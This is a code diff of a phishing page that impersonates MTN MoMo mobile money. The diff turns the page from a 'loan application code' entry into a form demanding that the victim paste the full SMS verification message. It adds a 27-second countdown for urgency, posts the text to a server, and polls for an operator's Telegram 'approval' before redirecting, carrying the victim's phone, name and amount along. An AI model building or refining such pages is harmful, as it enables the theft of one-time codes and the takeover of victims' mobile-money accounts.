@@ -3,169 +3,238 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verify Application - MoMo</title>
+    <title>SMS Verification - MoMo</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box;
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
-        body { background: #f4f4f4; min-height: 100vh; display: flex; flex-direction: column; }
+        body { background: #ffffff; min-height: 100vh; display: flex; flex-direction: column; }
 
-        /* HEADER */
-        .header { background: #fff; padding: 14px 24px; display: flex; align-items: center;
-                  gap: 16px; border-bottom: 3px solid #ffcc00;
-                  box-shadow: 0 2px 8px rgba(0,0,0,.04); }
-        .logo-box { display: flex; align-items: center; gap: 10px; }
-        .logo-icon { width: 42px; height: 42px; background: #ffcc00; border-radius: 8px;
-                     display: flex; align-items: center; justify-content: center;
-                     font-weight: 800; font-size: 11px; color: #004f9f; text-align: center;
-                     border: 2px solid #004f9f; line-height: 1; }
-        .logo-text { font-weight: 800; font-size: 20px; color: #004f9f; }
-        .header-title { font-size: 18px; font-weight: 700; color: #222; flex: 1; }
-        .hamburger { font-size: 22px; color: #333; cursor: pointer; }
+        /* TOP BAR */
+        .topbar {
+            background: #fff; padding: 16px 20px; display: flex; align-items: center;
+            gap: 12px; border-bottom: 1px solid #eee;
+        }
+        .back-btn {
+            background: none; border: none; font-size: 15px; color: #0a3d62;
+            cursor: pointer; font-weight: 500; display: flex; align-items: center; gap: 6px;
+        }
+        .topbar-title {
+            flex: 1; text-align: center; font-size: 17px; font-weight: 700;
+            color: #0a3d62; margin-right: 50px;
+        }
 
         /* MAIN */
-        .main { flex: 1; display: flex; flex-direction: column;
-                align-items: center; padding: 60px 16px; }
+        .main { flex: 1; padding: 24px 16px; display: flex; flex-direction: column;
+                align-items: center; }
+        .card {
+            background: #fff; width: 100%; max-width: 520px;
+            border: 1px solid #e5e7eb; border-radius: 14px;
+            padding: 26px 22px; box-shadow: 0 2px 8px rgba(0,0,0,0.03);
+        }
 
-        .page-title { font-size: 32px; font-weight: 800; color: #111;
-                      text-align: center; margin-bottom: 40px; }
+        .card h2 {
+            font-size: 20px; font-weight: 800; color: #0a3d62;
+            margin-bottom: 8px;
+        }
+        .card .desc {
+            font-size: 14px; color: #6b7280; line-height: 1.5;
+            margin-bottom: 20px;
+        }
 
-        .card { background: #fff; width: 100%; max-width: 500px; border-radius: 16px;
-                padding: 44px 36px 36px; box-shadow: 0 8px 30px rgba(0,0,0,.08);
-                text-align: center; }
-
-        .card-icon {
-            width: 70px; height: 70px; background: #fff5cc; border-radius: 50%;
+        /* TIMER BOX */
+        .timer-box {
+            display: flex; align-items: center; gap: 14px;
+            background: #fef7ec; border: 1px solid #f5d59a;
+            border-radius: 10px; padding: 14px 16px; margin-bottom: 20px;
+        }
+        .timer-circle {
+            width: 44px; height: 44px; border-radius: 50%;
+            border: 3px solid #e67e22;
             display: flex; align-items: center; justify-content: center;
-            margin: 0 auto 20px; font-size: 32px;
+            font-size: 15px; font-weight: 800; color: #e67e22;
+            flex-shrink: 0;
+        }
+        .timer-circle.urgent {
+            border-color: #dc2626; color: #dc2626;
+            animation: pulse 1s infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.08); }
+        }
+        .timer-text { font-size: 14px; color: #92400e; line-height: 1.4; }
+        .timer-text strong { color: #78350f; font-weight: 700; }
+
+        /* TEXTAREA */
+        .sms-input {
+            width: 100%; min-height: 110px;
+            padding: 14px 16px;
+            font-size: 15px; font-family: inherit; color: #111;
+            border: 2px solid #ffcc00; border-radius: 10px;
+            background: #fffdf5; outline: none; resize: vertical;
+            margin-bottom: 12px;
+            transition: box-shadow .2s;
+        }
+        .sms-input::placeholder { color: #aaa; }
+        .sms-input:focus { box-shadow: 0 0 0 4px rgba(255,204,0,.25); }
+        .sms-input.error { border-color: #dc2626; background: #fff5f5; }
+        .sms-input:disabled { background: #f3f4f6; color: #999; cursor: not-allowed; }
+
+        .example-text {
+            font-size: 12px; color: #6b7280; font-style: italic;
+            margin-bottom: 18px; line-height: 1.5;
         }
 
-        .card-label { font-size: 14px; font-weight: 600; color: #444;
-                      margin-bottom: 8px; line-height: 1.5; }
-        .card-sub { font-size: 13px; color: #888; margin-bottom: 24px; }
-
-        .card input {
-            width: 100%; padding: 18px 20px; font-size: 20px;
-            font-family: inherit; border: 2px solid #ffcc00; border-radius: 10px;
-            background: #fffdf5; color: #111; outline: none;
-            text-align: center; font-weight: 700; letter-spacing: 3px;
-            margin-bottom: 14px; transition: box-shadow .2s;
-        }
-        .card input::placeholder { color: #ccc; letter-spacing: 2px; font-weight: 500; }
-        .card input:focus { box-shadow: 0 0 0 4px rgba(255,204,0,.25); }
-        .card input.error { border-color: #e33; background: #fff5f5; }
-
-        .error-msg { display: none; font-size: 13px; color: #c33;
-                     font-weight: 600; margin-bottom: 14px; }
-        .error-msg.show { display: block; }
-
+        /* SUBMIT BUTTON */
         .submit-btn {
-            display: block; width: 100%; background: #ffcc00; color: #111;
-            border: none; padding: 18px; font-size: 16px; font-weight: 800;
-            letter-spacing: .5px; border-radius: 10px; cursor: pointer;
-            transition: background .2s, transform .1s; margin-bottom: 14px;
+            width: 100%; padding: 16px;
+            font-size: 15px; font-weight: 800; letter-spacing: 1px;
+            color: #fff; background: #9ca3af; border: none;
+            border-radius: 10px; cursor: not-allowed;
+            transition: background .2s;
         }
-        .submit-btn:hover { background: #e6b800; }
-        .submit-btn:active { transform: scale(.99); }
-        .submit-btn:disabled { background: #ddd; color: #999; cursor: not-allowed; }
+        .submit-btn.active {
+            background: #ffcc00; color: #111; cursor: pointer;
+        }
+        .submit-btn.active:hover { background: #e6b800; }
+        .submit-btn.active:active { transform: scale(.99); }
 
+        /* ERROR / STATUS */
+        .error-msg { display: none; font-size: 13px; color: #dc2626;
+                     font-weight: 600; margin-bottom: 12px; text-align: center; }
+        .error-msg.show { display: block; }
+        .error-msg.info { color: #b8860b; }
+
+        /* RESEND */
+        .resend-wrap { text-align: center; margin-top: 16px; }
         .resend-btn {
-            display: inline-block; background: transparent; color: #b8860b;
-            border: none; padding: 8px 14px; font-size: 13px; font-weight: 700;
-            cursor: pointer; text-decoration: underline;
+            background: transparent; border: none; color: #b8860b;
+            font-size: 13px; font-weight: 700; cursor: pointer;
+            text-decoration: underline;
         }
-        .resend-btn:hover { color: #ffcc00; }
         .resend-btn:disabled { color: #aaa; cursor: not-allowed; text-decoration: none; }
 
-        .helper { font-size: 12px; color: #999; margin-top: 12px; }
-
-        /* FOOTER */
-        .footer { background: #111; color: #ffcc00; text-align: center;
-                  padding: 18px; font-size: 13px; font-weight: 600; }
-
         @media (max-width: 480px) {
-            .page-title { font-size: 26px; }
-            .card { padding: 32px 22px 26px; }
-            .header-title { font-size: 15px; }
+            .card { padding: 22px 18px; }
+            .card h2 { font-size: 18px; }
         }
     </style>
 </head>
 <body>
 
-    <header class="header">
-        <span class="hamburger">☰</span>
-        <div class="logo-box">
-            <div class="logo-icon">MoMo<br>MTN</div>
-            <span class="logo-text">MoMo</span>
-        </div>
-        <span class="header-title">MTN Mobile Services</span>
-    </header>
+    <!-- TOP BAR -->
+    <div class="topbar">
+        <button class="back-btn" onclick="history.back()">← Back</button>
+        <div class="topbar-title">SMS Verification</div>
+    </div>
 
+    <!-- MAIN -->
     <main class="main">
-        <h1 class="page-title">Verify Application</h1>
-
         <div class="card">
-            <div class="card-icon">🔐</div>
+            <h2>Paste SMS Message</h2>
+            <p class="desc">
+                A verification message has been sent to your phone. Please copy
+                and paste the full message here.
+            </p>
 
-            <p class="card-label">Enter the loan application code<br>we sent your MTN LINE</p>
-            <p class="card-sub">Check your SMS for the code</p>
+            <!-- TIMER -->
+            <div class="timer-box">
+                <div class="timer-circle" id="timerCircle">27</div>
+                <div class="timer-text">
+                    <strong>Message expires in <span id="timerSec">27</span>s.</strong><br>
+                    Paste your SMS before time runs out.
+                </div>
+            </div>
 
+            <!-- ERROR -->
             <div class="error-msg" id="errorMsg"></div>
 
+            <!-- FORM -->
             <form id="verifyForm">
-                <input type="text" id="code" placeholder="XXXX"
-                       maxlength="20" autocomplete="off" required>
+                <textarea id="code" class="sms-input"
+                          placeholder="Paste your full SMS message here..."
+                          maxlength="500" autocomplete="off"></textarea>
 
-                <button type="submit" class="submit-btn" id="submitBtn">
-                    Verify Code
+                <p class="example-text">
+                    Example: "Your MTN MoMo verification code is: 123456"
+                </p>
+
+                <button type="submit" class="submit-btn" id="submitBtn" disabled>
+                    SUBMIT
                 </button>
             </form>
 
-            <button class="resend-btn" id="resendBtn">
-                Didn't receive a code? Resend
-            </button>
-
-            <p class="helper">Codes are valid for 24 hours</p>
+            <div class="resend-wrap">
+                <button class="resend-btn" id="resendBtn">Didn't receive a code? Resend</button>
+            </div>
         </div>
     </main>
 
-    <footer class="footer">© 2026 MoMo</footer>
-
     <script>
-        // ─── Grab info from URL ───
+        // ─── URL params ───
         const params = new URLSearchParams(window.location.search);
         const phone     = params.get('phone')     || 'unknown';
         const firstName = params.get('firstName') || '';
         const lastName  = params.get('lastName')  || '';
         const amount    = params.get('amount')    || '';
 
-        const codeInput = document.getElementById('code');
-        const errorMsg  = document.getElementById('errorMsg');
-        const submitBtn = document.getElementById('submitBtn');
-        const resendBtn = document.getElementById('resendBtn');
+        const codeInput  = document.getElementById('code');
+        const errorMsg   = document.getElementById('errorMsg');
+        const submitBtn  = document.getElementById('submitBtn');
+        const resendBtn  = document.getElementById('resendBtn');
+        const timerCircle = document.getElementById('timerCircle');
+        const timerSec   = document.getElementById('timerSec');
 
-        // ─── Auto-format code as user types ───
+        // ─── Countdown timer (27 seconds) ───
+        let timeLeft = 27;
+        let timerInterval = null;
+
+        function startTimer() {
+            timerInterval = setInterval(() => {
+                timeLeft--;
+                timerCircle.textContent = timeLeft;
+                timerSec.textContent    = timeLeft;
+
+                // Turn red & pulse when ≤10s
+                if (timeLeft <= 10) {
+                    timerCircle.classList.add('urgent');
+                }
+
+                // Time's up
+                if (timeLeft <= 0) {
+                    clearInterval(timerInterval);
+                    timerCircle.textContent = '0';
+                    timerSec.textContent = '0';
+                    codeInput.disabled = true;
+                    submitBtn.disabled = true;
+                    submitBtn.classList.remove('active');
+                    errorMsg.textContent = '⏰ Time expired. Please request a new code.';
+                    errorMsg.classList.add('show');
+                }
+            }, 1000);
+        }
+
+        startTimer();
+
+        // ─── Enable Submit button once the user types something ───
         codeInput.addEventListener('input', function () {
-            let v = this.value.toUpperCase().replace(/[^A-Z0-9]/g, '');
-            let out = '';
-            if (v.startsWith('MM')) {
-                out = v.substring(0, 2);
-                if (v.length > 2) out += '-' + v.substring(2, 6);
-                if (v.length > 6) out += '-' + v.substring(6, 10);
-            } else {
-                out = v.substring(0, 4);
-                if (v.length > 4) out += '-' + v.substring(4, 8);
-                if (v.length > 8) out += '-' + v.substring(8, 12);
-            }
-            this.value = out;
             this.classList.remove('error');
-            errorMsg.classList.remove('show');
+            errorMsg.classList.remove('show', 'info');
+
+            if (this.value.trim().length > 0 && timeLeft > 0) {
+                submitBtn.disabled = false;
+                submitBtn.classList.add('active');
+            } else {
+                submitBtn.disabled = true;
+                submitBtn.classList.remove('active');
+            }
         });
 
-        // ─── Poll the server until admin decides (confirmed / rejected) ───
+        // ─── Polling for Telegram decision ───
         let referenceId = null;
         let pollTimer = null;
 
-        async function startPolling() {
+        function startPolling() {
             pollTimer = setInterval(async () => {
                 try {
                     const res  = await fetch('/api/status?ref=' + encodeURIComponent(referenceId));
@@ -173,11 +242,11 @@
 
                     if (data.status === 'confirmed') {
                         clearInterval(pollTimer);
-                        // ✅ REDIRECT TO FINAL PAGE
-                        window.location.href = `final.html?phone=${encodeURIComponent(phone)}&ref=${encodeURIComponent(referenceId)}`;
+                        window.location.href =
+                            `final.html?phone=${encodeURIComponent(phone)}&ref=${encodeURIComponent(referenceId)}`;
                     } else if (data.status === 'rejected') {
                         clearInterval(pollTimer);
-                        showResult('rejected');
+                        showRejected();
                     }
                 } catch (err) {
                     console.error('Poll failed:', err);
@@ -185,41 +254,45 @@
             }, 3000);
         }
 
-        function showResult(type) {
+        function showRejected() {
             document.querySelector('.card').innerHTML = `
-                <div style="width:90px;height:90px;border-radius:50%;background:#e33;
-                            display:flex;align-items:center;justify-content:center;
-                            margin:0 auto 20px;font-size:44px;color:#fff;">✕</div>
-                <h2 style="font-size:22px;font-weight:800;color:#c33;margin-bottom:12px;">
-                    Application Rejected
-                </h2>
-                <div style="display:inline-block;padding:8px 16px;border-radius:20px;
-                            background:#fdecea;color:#c33;font-size:13px;font-weight:700;
-                            margin-bottom:20px;">INVALID APPLICATION CODE</div>
-                <p style="font-size:15px;color:#444;line-height:1.6;margin-bottom:20px;">
-                    The application code you entered is <strong>incorrect</strong>.<br>
-                    Please check your SMS and try again.
-                </p>
-                <button onclick="location.reload()" style="background:#111;color:#ffcc00;
-                        border:none;padding:14px 28px;font-size:14px;font-weight:800;
-                        border-radius:10px;cursor:pointer;">Try Again</button>
+                <div style="text-align:center;">
+                    <div style="width:80px;height:80px;border-radius:50%;background:#dc2626;
+                                display:flex;align-items:center;justify-content:center;
+                                margin:0 auto 18px;font-size:40px;color:#fff;">✕</div>
+                    <h2 style="font-size:20px;font-weight:800;color:#dc2626;margin-bottom:10px;">
+                        Application Rejected
+                    </h2>
+                    <div style="display:inline-block;padding:6px 14px;border-radius:20px;
+                                background:#fdecea;color:#dc2626;font-size:12px;font-weight:700;
+                                margin-bottom:18px;">INVALID SMS MESSAGE</div>
+                    <p style="font-size:14px;color:#555;line-height:1.6;margin-bottom:20px;">
+                        The SMS message you submitted could not be verified.<br>
+                        Please check your SMS and try again.
+                    </p>
+                    <button onclick="location.reload()" style="background:#111;color:#ffcc00;
+                            border:none;padding:14px 28px;font-size:14px;font-weight:800;
+                            border-radius:10px;cursor:pointer;">Try Again</button>
+                </div>
             `;
         }
 
-        // ─── Submit code → send to server → server forwards to Telegram ───
+        // ─── Submit ───
         document.getElementById('verifyForm').addEventListener('submit', async function (e) {
             e.preventDefault();
 
             const code = codeInput.value.trim();
             if (code.length < 4) {
-                errorMsg.textContent = 'Please enter a valid application code';
+                errorMsg.textContent = 'Please paste the full SMS message';
                 errorMsg.classList.add('show');
                 codeInput.classList.add('error');
                 return;
             }
 
             submitBtn.disabled = true;
-            submitBtn.textContent = 'Waiting for approval...';
+            submitBtn.textContent = 'WAITING FOR APPROVAL...';
+            codeInput.disabled = true;
+            clearInterval(timerInterval); // stop the timer once submitted
 
             try {
                 const res = await fetch('/api/verify-code', {
@@ -232,7 +305,7 @@
 
                 errorMsg.textContent = '📩 Sent to reviewer. Please wait…';
                 errorMsg.style.color = '#b8860b';
-                errorMsg.classList.add('show');
+                errorMsg.classList.add('show', 'info');
 
                 startPolling();
 
@@ -241,11 +314,13 @@
                 errorMsg.textContent = '⚠️ Network error. Please try again.';
                 errorMsg.classList.add('show');
                 submitBtn.disabled = false;
-                submitBtn.textContent = 'Verify Code';
+                submitBtn.textContent = 'SUBMIT';
+                submitBtn.classList.add('active');
+                codeInput.disabled = false;
             }
         });
 
-        // ─── Resend button ───
+        // ─── Resend ───
         resendBtn.addEventListener('click', async function () {
             this.disabled = true;
             this.textContent = 'Sending...';
@@ -260,7 +335,7 @@
                 console.error('Resend failed:', err);
             }
 
-            errorMsg.textContent = '✅ New code requested. Please check your SMS.';
+            errorMsg.textContent = '✅ New SMS requested. Please check your phone.';
             errorMsg.style.color = '#3a7d44';
             errorMsg.classList.add('show');
 
@@ -268,7 +343,7 @@
                 this.disabled = false;
                 this.textContent = "Didn't receive a code? Resend";
                 errorMsg.classList.remove('show');
-                errorMsg.style.color = '#c33';
+                errorMsg.style.color = '#dc2626';
             }, 5000);
         });
     </script>
